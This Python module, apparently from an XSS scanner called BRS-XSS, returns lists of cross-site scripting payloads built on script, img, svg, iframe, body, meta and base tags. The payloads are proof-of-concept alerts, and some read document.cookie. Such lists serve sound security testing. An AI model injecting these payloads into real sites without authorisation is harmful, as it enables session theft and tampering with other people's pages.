#!/usr/bin/env python3

"""
Project: BRS-XSS (XSS Detection Suite)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: Sun 10 Aug 2025 21:38:09 MSK
Status: Created
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class BasicXSSPayloads:
    """Basic XSS payload collection"""
    
    @staticmethod
    def get_script_payloads() -> List[str]:
        """Basic script-based XSS payloads"""
        return [
            # Simple alert variants
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<script>alert(location.href)</script>',
            '<script>alert(navigator.userAgent)</script>',
            
            # Execution methods
            '<script>eval("alert(1)")</script>',
            '<script>setTimeout("alert(1)",0)</script>',
            '<script>Function("alert(1)")()</script>',
            '<script>[].constructor.constructor("alert(1)")()</script>',
            '<script>window["alert"](1)</script>',
            '<script>window.alert(1)</script>',
            '<script>this.alert(1)</script>',
            '<script>self.alert(1)</script>',
            '<script>parent.alert(1)</script>',
            '<script>top.alert(1)</script>',
            
            # Math and string methods
            '<script>alert(Math.floor(1))</script>',
            '<script>alert(String.fromCharCode(49))</script>',
            '<script>alert(parseInt("1"))</script>',
            '<script>alert(Number("1"))</script>',
            
            # Console and debug
            '<script>console.log("XSS")</script>',
            '<script>console.error("XSS")</script>',
            '<script>debugger</script>',
            
            # Document manipulation
            '<script>document.body.innerHTML="XSS"</script>',
            '<script>document.title="XSS"</script>',
            '<script>document.write("XSS")</script>',
            '<script>document.writeln("XSS")</script>',
        ]
    
    @staticmethod
    def get_img_payloads() -> List[str]:
        """Image-based XSS payloads"""
        return [
            # Basic img onerror
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror="alert(1)">',
            '<img src=x onerror=\'alert(1)\'>',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '<img src=x onerror=prompt(1)>',
            '<img src=x onerror=confirm(1)>',
            
            # Complex expressions
            '<img src=x onerror=alert(document.domain)>',
            '<img src=x onerror=alert(document.cookie)>',
            '<img src=x onerror=eval("alert(1)")>',
            '<img src=x onerror=setTimeout("alert(1)",0)>',
            '<img src=x onerror=Function("alert(1)")()>',
            
            # Alternative attributes
            '<img onload=alert(1) src=data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==>',
            '<img onerror=alert(1) src>',
            '<img onerror=alert(1) src="">',
            '<img onerror=alert(1) src=">',
            
            # Different src values
            '<img src="javascript:alert(1)">',
            '<img src="data:text/html,<script>alert(1)</script>">',
            '<img src="vbscript:alert(1)">',
        ]
    
    @staticmethod
    def get_svg_payloads() -> List[str]:
        """SVG-based XSS payloads"""
        return [
            # Basic SVG
            '<svg onload=alert(1)>',
            '<svg onload="alert(1)">',
            '<svg onload=\'alert(1)\'>',
            '<svg onload=alert(String.fromCharCode(88,83,83))>',
            '<svg onload=prompt(1)>',
            '<svg onload=confirm(1)>',
            
            # SVG with content
            '<svg><script>alert(1)</script></svg>',
            '<svg onload=alert(1)></svg>',
            '<svg/onload=alert(1)>',
            '<svg\nonload=alert(1)>',
            '<svg\tonload=alert(1)>',
            
            # Complex SVG
            '<svg onload=eval("alert(1)")>',
            '<svg onload=setTimeout("alert(1)",0)>',
            '<svg onload=Function("alert(1)")()>',
            '<svg onload=alert(document.domain)>',
            '<svg onload=alert(document.cookie)>',
            
            # SVG with animations
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><animateTransform onbegin=alert(1) attributeName=transform>',
            '<svg><set onbegin=alert(1) attributeName=x to=1>',
        ]
    
    @staticmethod
    def get_iframe_payloads() -> List[str]:
        """Iframe-based XSS payloads"""
        return [
            # JavaScript protocol
            '<iframe src=javascript:alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<iframe src=\'javascript:alert(1)\'>',
            '<iframe src=javascript:alert(String.fromCharCode(88,83,83))>',
            '<iframe src=javascript:prompt(1)>',
            '<iframe src=javascript:confirm(1)>',
            
            # Data URLs
            '<iframe src="data:text/html,<script>alert(1)</script>">',
            '<iframe src="data:text/html,<svg onload=alert(1)>">',
            '<iframe src="data:text/html,<img src=x onerror=alert(1)>">',
            '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
            
            # Event handlers
            '<iframe onload=alert(1)>',
            '<iframe onload="alert(1)">',
            '<iframe onload=\'alert(1)\'>',
            '<iframe onerror=alert(1)>',
            
            # Other protocols
            '<iframe src=vbscript:alert(1)>',
            '<iframe src=livescript:alert(1)>',
            '<iframe srcdoc="<script>alert(1)</script>">',
        ]
    
    @staticmethod
    def get_body_payloads() -> List[str]:
        """Body and HTML element payloads"""
        return [
            # Body events
            '<body onload=alert(1)>',
            '<body onload="alert(1)">',
            '<body onload=\'alert(1)\'>',
            '<body onpageshow=alert(1)>',
            '<body onfocus=alert(1)>',
            '<body onhashchange=alert(1)>',
            '<body onpopstate=alert(1)>',
            '<body onresize=alert(1)>',
            '<body onscroll=alert(1)>',
            '<body onunload=alert(1)>',
            '<body onbeforeunload=alert(1)>',
            '<body onerror=alert(1)>',
            
            # Other HTML elements
            '<html onmouseover=alert(1)>',
            '<head><title>XSS</title></head>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            '<base href="javascript:alert(1)//">',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all basic XSS payloads"""
        payloads = []
        payloads.extend(BasicXSSPayloads.get_script_payloads())
        payloads.extend(BasicXSSPayloads.get_img_payloads())
        payloads.extend(BasicXSSPayloads.get_svg_payloads())
        payloads.extend(BasicXSSPayloads.get_iframe_payloads())
        payloads.extend(BasicXSSPayloads.get_body_payloads())
        return payloads